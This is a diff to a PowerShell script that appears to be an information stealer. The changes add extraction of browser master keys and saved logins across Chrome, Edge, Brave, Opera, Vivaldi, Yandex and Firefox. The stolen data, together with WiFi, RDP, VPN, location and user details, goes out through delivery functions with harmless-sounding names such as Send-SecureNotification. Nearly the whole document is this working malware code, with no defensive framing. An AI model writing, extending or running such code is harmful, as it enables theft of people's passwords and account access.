@@ -242,7 +242,7 @@ function Get-RemoteConnectionData {
     }
 }
 
-# Secure message function - FIXED
+# Secure message function
 function Send-SecureNotification {
     param([string]$MessageText)
     
@@ -270,7 +270,7 @@ function Send-SecureNotification {
     }
 }
 
-# Secure communication function - FIXED
+# Secure communication function
 function Invoke-SecureDelivery {
     param(
         [string]$ContentPath,
@@ -360,7 +360,61 @@ function Install-DatabaseTool {
     }
 }
 
-# Function to extract browser encrypted passwords
+# Function to extract browser master key (DPAPI)
+function Get-BrowserMasterKey {
+    param(
+        [string]$BrowserDataPath,
+        [string]$BrowserName
+    )
+    
+    $masterKeyInfo = @{
+        Browser = $BrowserName
+        LocalStatePath = ""
+        MasterKey = ""
+        KeyDerivation = ""
+        EncryptionType = ""
+        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    }
+    
+    try {
+        # Chrome/Edge/Brave local state file
+        $localStatePath = Join-Path $BrowserDataPath "Local State"
+        if (Test-Path $localStatePath) {
+            $masterKeyInfo.LocalStatePath = $localStatePath
+            $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            
+            if ($localStateContent.os_crypt -and $localStateContent.os_crypt.encrypted_key) {
+                $encryptedKey = $localStateContent.os_crypt.encrypted_key
+                $masterKeyInfo.MasterKey = $encryptedKey
+                $masterKeyInfo.EncryptionType = "DPAPI"
+                
+                # Check key derivation method
+                if ($localStateContent.os_crypt.key_derivation) {
+                    $masterKeyInfo.KeyDerivation = $localStateContent.os_crypt.key_derivation
+                } else {
+                    $masterKeyInfo.KeyDerivation = "PBKDF2"
+                }
+            }
+        }
+        
+        # Firefox key4.db location
+        if ($BrowserName -eq "Firefox") {
+            $key4dbPath = Join-Path $BrowserDataPath "key4.db"
+            if (Test-Path $key4dbPath) {
+                $masterKeyInfo.MasterKey = "Firefox Key4 Database"
+                $masterKeyInfo.EncryptionType = "ASN1"
+                $masterKeyInfo.KeyDerivation = "PKCS5_PBKDF2"
+            }
+        }
+        
+    } catch {
+        Write-Host "Master key extraction error for $BrowserName: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    return $masterKeyInfo
+}
+
+# Enhanced function to extract browser encrypted passwords
 function Get-BrowserStorageData {
     param(
         [string]$BrowserDataPath,
@@ -370,33 +424,68 @@ function Get-BrowserStorageData {
     $loginDataFiles = @()
     $results = @()
     $encryptedData = @()
+    $browserMasterKey = Get-BrowserMasterKey -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
     
     if (-not (Test-Path $BrowserDataPath)) {
         Write-Host "$BrowserName data directory not found" -ForegroundColor Yellow
-        return @{ Summary = @(); DetailedData = @() }
+        return @{ 
+            Summary = @()
+            DetailedData = @()
+            MasterKeyInfo = $browserMasterKey
+            Status = "Directory not found"
+        }
     }
     
-    # Check default profile
-    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
-    if (Test-Path $defaultLoginData) {
-        $loginDataFiles += @{ Path = $defaultLoginData; Profile = "Default" }
+    # Define browser-specific database paths
+    $browserDatabasePaths = @{
+        "Chrome" = @("Default\Login Data", "*\Login Data")
+        "Edge" = @("Default\Login Data", "*\Login Data") 
+        "Brave" = @("Default\Login Data", "*\Login Data")
+        "Firefox" = @("logins.json", "key4.db")
+        "Opera" = @("Login Data")
+        "Vivaldi" = @("Default\Login Data", "*\Login Data")
+        "Yandex" = @("User Data\Default\Login Data", "User Data\*\Login Data")
     }
     
-    # Check other profiles
-    $profilePatterns = @("Profile *", "Profile*", "User *", "User*")
-    foreach ($pattern in $profilePatterns) {
-        $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter $pattern -ErrorAction SilentlyContinue
-        foreach ($profileDir in $profileDirs) {
-            $loginDataPath = Join-Path $profileDir.FullName "Login Data"
-            if (Test-Path $loginDataPath) {
-                $loginDataFiles += @{ Path = $loginDataPath; Profile = $profileDir.Name }
+    # Get database paths for this browser
+    $databasePatterns = if ($browserDatabasePaths.ContainsKey($BrowserName)) {
+        $browserDatabasePaths[$BrowserName]
+    } else {
+        @("Default\Login Data", "*\Login Data")
+    }
+    
+    foreach ($pattern in $databasePatterns) {
+        if ($pattern -like "*\*") {
+            # Pattern with wildcard
+            $parentDir = Split-Path $pattern -Parent
+            $filePattern = Split-Path $pattern -Leaf
+            
+            $parentPath = Join-Path $BrowserDataPath $parentDir
+            if (Test-Path $parentPath) {
+                $matchingFiles = Get-ChildItem -Path $parentPath -Filter $filePattern -Recurse -ErrorAction SilentlyContinue
+                foreach $file in $matchingFiles {
+                    $profileName = $file.Directory.Name
+                    $loginDataFiles += @{ Path = $file.FullName; Profile = $profileName }
+                }
+            }
+        } else {
+            # Specific file path
+            $fullPath = Join-Path $BrowserDataPath $pattern
+            if (Test-Path $fullPath) {
+                $profileName = if ($pattern -match "Default") { "Default" } else { "Root" }
+                $loginDataFiles += @{ Path = $fullPath; Profile = $profileName }
             }
         }
     }
     
     if ($loginDataFiles.Count -eq 0) {
         Write-Host "No login databases found for $BrowserName" -ForegroundColor Yellow
-        return @{ Summary = @(); DetailedData = @() }
+        return @{ 
+            Summary = @()
+            DetailedData = @()
+            MasterKeyInfo = $browserMasterKey
+            Status = "No databases found"
+        }
     }
     
     Write-Host "Found $($loginDataFiles.Count) databases for $BrowserName" -ForegroundColor Green
@@ -411,71 +500,173 @@ function Get-BrowserStorageData {
             $tempDbPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
             Copy-Item $dbPath $tempDbPath -Force
             
-            $tempOutputPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
-            
-            $query = "SELECT origin_url, username_value, hex(password_value) as password_hex FROM logins;"
-            & .\sqlite3.exe -csv -header $tempDbPath $query > $tempOutputPath
-            
-            if (Test-Path $tempOutputPath) {
-                $logins = Import-Csv $tempOutputPath
-                Write-Host "    Found $($logins.Count) entries" -ForegroundColor Green
-                
-                foreach ($login in $logins) {
-                    $entryId = [System.Guid]::NewGuid().ToString()
-                    
-                    $encryptedEntry = @{
-                        Id = $entryId
-                        Browser = $BrowserName
-                        Profile = $profileName
-                        URL = $login.origin_url
-                        Username = $login.username_value
-                        HexData = $login.password_hex
-                        DataLength = if ($login.password_hex) { $login.password_hex.Length / 2 } else { 0 }
-                        EncryptionVersion = "Unknown"
-                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                    }
-                    
-                    # Detect encryption version
-                    if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$" -and $login.password_hex.Length -ge 6) {
-                        try {
-                            $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16), 
-                                          [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
-                                          [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
-                            $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
-                            
-                            if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
-                                $encryptedEntry.EncryptionVersion = $prefix
-                            }
-                        } catch {}
-                    }
-                    
-                    $encryptedData += $encryptedEntry
-                    $results += [PSCustomObject]@{
-                        ID = $entryId
-                        Browser = $BrowserName
-                        Profile = $profileName
-                        URL = $login.origin_url
-                        Username = $login.username_value
-                        EncryptionVersion = $encryptedEntry.EncryptionVersion
-                        DataLength = $encryptedEntry.DataLength
-                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            # Different queries for different browsers
+            if ($BrowserName -eq "Firefox") {
+                # Firefox uses logins.json instead of SQLite
+                $loginsJsonPath = Join-Path (Split-Path $dbPath -Parent) "logins.json"
+                if (Test-Path $loginsJsonPath) {
+                    $firefoxLogins = Get-Content $loginsJsonPath -Raw | ConvertFrom-Json
+                    foreach ($login in $firefoxLogins.logins) {
+                        $entryId = [System.Guid]::NewGuid().ToString()
+                        
+                        $encryptedEntry = @{
+                            Id = $entryId
+                            Browser = $BrowserName
+                            Profile = $profileName
+                            URL = $login.hostname
+                            Username = $login.username
+                            HexData = $login.password
+                            DataLength = if ($login.password) { $login.password.Length } else { 0 }
+                            EncryptionVersion = "Firefox"
+                            FormSubmitURL = $login.formSubmitURL
+                            UsernameField = $login.usernameField
+                            PasswordField = $login.passwordField
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                        
+                        $encryptedData += $encryptedEntry
+                        $results += [PSCustomObject]@{
+                            ID = $entryId
+                            Browser = $BrowserName
+                            Profile = $profileName
+                            URL = $login.hostname
+                            Username = $login.username
+                            EncryptionVersion = "Firefox"
+                            DataLength = $encryptedEntry.DataLength
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
                     }
                 }
+            } else {
+                # Chrome-based browsers
+                $tempOutputPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
                 
-                Remove-Item $tempOutputPath -Force -ErrorAction SilentlyContinue
+                $query = @"
+SELECT 
+    origin_url, 
+    username_value, 
+    hex(password_value) as password_hex,
+    date_created,
+    date_last_used,
+    times_used,
+    blacklisted_by_user,
+    scheme,
+    signon_realm
+FROM logins;
+"@
+                & .\sqlite3.exe -csv -header $tempDbPath $query > $tempOutputPath
+                
+                if (Test-Path $tempOutputPath) {
+                    $logins = Import-Csv $tempOutputPath
+                    Write-Host "    Found $($logins.Count) entries" -ForegroundColor Green
+                    
+                    foreach ($login in $logins) {
+                        $entryId = [System.Guid]::NewGuid().ToString()
+                        
+                        $encryptedEntry = @{
+                            Id = $entryId
+                            Browser = $BrowserName
+                            Profile = $profileName
+                            URL = $login.origin_url
+                            Username = $login.username_value
+                            HexData = $login.password_hex
+                            DataLength = if ($login.password_hex) { $login.password_hex.Length / 2 } else { 0 }
+                            EncryptionVersion = "Unknown"
+                            DateCreated = $login.date_created
+                            DateLastUsed = $login.date_last_used
+                            TimesUsed = $login.times_used
+                            Blacklisted = $login.blacklisted_by_user
+                            Scheme = $login.scheme
+                            SignonRealm = $login.signon_realm
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                        
+                        # Detect encryption version
+                        if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$" -and $login.password_hex.Length -ge 6) {
+                            try {
+                                $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16), 
+                                              [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
+                                              [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
+                                $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
+                                
+                                if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
+                                    $encryptedEntry.EncryptionVersion = $prefix
+                                } else {
+                                    $encryptedEntry.EncryptionVersion = "DPAPI"
+                                }
+                            } catch {
+                                $encryptedEntry.EncryptionVersion = "DPAPI"
+                            }
+                        }
+                        
+                        $encryptedData += $encryptedEntry
+                        $results += [PSCustomObject]@{
+                            ID = $entryId
+                            Browser = $BrowserName
+                            Profile = $profileName
+                            URL = $login.origin_url
+                            Username = $login.username_value
+                            EncryptionVersion = $encryptedEntry.EncryptionVersion
+                            DataLength = $encryptedEntry.DataLength
+                            DateCreated = $login.date_created
+                            DateLastUsed = $login.date_last_used
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                    }
+                    
+                    Remove-Item $tempOutputPath -Force -ErrorAction SilentlyContinue
+                }
             }
             
             Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
             
         } catch {
-            Write-Host "    Profile $profileName processing error" -ForegroundColor Red
+            Write-Host "    Profile $profileName processing error: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
     
     return @{
         Summary = $results
         DetailedData = $encryptedData
+        MasterKeyInfo = $browserMasterKey
+        Status = "Success"
+        TotalEntries = $results.Count
     }
+}
+
+# Function to get all browser paths
+function Get-AllBrowserPaths {
+    $browserPaths = @{}
+    
+    # Chrome-based browsers
+    $chromeBrowsers = @{
+        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
+        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
+        "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
+    }
+    
+    # Firefox
+    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxProfiles) {
+        $firefoxDirs = Get-ChildItem -Path $firefoxProfiles -Directory -ErrorAction SilentlyContinue
+        foreach ($dir in $firefoxDirs) {
+            if (Test-Path (Join-Path $dir.FullName "logins.json")) {
+                $browserPaths["Firefox_$($dir.Name)"] = $dir.FullName
+            }
+        }
+    }
+    
+    # Add Chrome-based browsers
+    foreach ($browser in $chromeBrowsers.Keys) {
+        if (Test-Path $chromeBrowsers[$browser]) {
+            $browserPaths[$browser] = $chromeBrowsers[$browser]
+        }
+    }
+    
+    return $browserPaths
 }
 
 # Main execution
@@ -509,15 +700,26 @@ if (-not (Test-Path ".\sqlite3.exe")) {
     }
 }
 
-# Extract browser data
+# Extract browser data from ALL available browsers
 $browserData = @{}
-$browsersToCheck = @("Chrome", "Edge", "Brave")
+$allBrowserPaths = Get-AllBrowserPaths
 
-foreach ($browser in $browsersToCheck) {
-    Write-Host "`nProcessing $browser..." -ForegroundColor Yellow
-    $browserPath = "$env:LOCALAPPDATA\$($browser.Replace(' ', ''))\User Data"
-    $result = Get-BrowserStorageData -BrowserDataPath $browserPath -BrowserName $browser
-    $browserData[$browser] = $result
+Write-Host "`nFound $($allBrowserPaths.Count) browsers to process:" -ForegroundColor Yellow
+$allBrowserPaths.GetEnumerator() | ForEach-Object { Write-Host "  - $($_.Key): $($_.Value)" -ForegroundColor Cyan }
+
+foreach ($browserEntry in $allBrowserPaths.GetEnumerator()) {
+    $browserName = $browserEntry.Key
+    $browserPath = $browserEntry.Value
+    
+    Write-Host "`nProcessing $browserName..." -ForegroundColor Yellow
+    $result = Get-BrowserStorageData -BrowserDataPath $browserPath -BrowserName $browserName
+    $browserData[$browserName] = $result
+    
+    if ($result.TotalEntries -gt 0) {
+        Write-Host "  ✓ Found $($result.TotalEntries) credentials" -ForegroundColor Green
+    } else {
+        Write-Host "  ✗ No credentials found" -ForegroundColor Red
+    }
 }
 
 # Create consolidated data files
@@ -530,6 +732,8 @@ $consolidatedBrowserData = @{
         City = $networkInfo.City
         ComputerName = $systemSpecs.ComputerName
         UserName = $systemSpecs.UserName
+        TotalBrowsers = $allBrowserPaths.Count
+        TotalCredentials = ($browserData.Values | ForEach-Object { $_.TotalEntries } | Measure-Object -Sum).Sum
     }
     BrowserData = $browserData
 }
@@ -599,11 +803,13 @@ if ($testResult) {
     $systemSent = Invoke-SecureDelivery -ContentPath $systemDataPath -Description $systemDescription
 
     # Send completion notification
+    $totalCredentials = ($browserData.Values | ForEach-Object { $_.TotalEntries } | Measure-Object -Sum).Sum
     $completionMessage = @"
 ✅ <b>Data Collection Completed</b>
 
 📊 <b>Summary:</b>
-• Browser entries: $(($browserData.Values.Summary | Measure-Object).Count)
+• Browsers processed: $($allBrowserPaths.Count)
+• Total credentials: $totalCredentials
 • WiFi networks: $($wirelessData.TotalNetworks)
 • RDP connections: $($remoteConnections.RDPConnections.Count)
 • VPN configurations: $($remoteConnections.VPNConnections.Count)
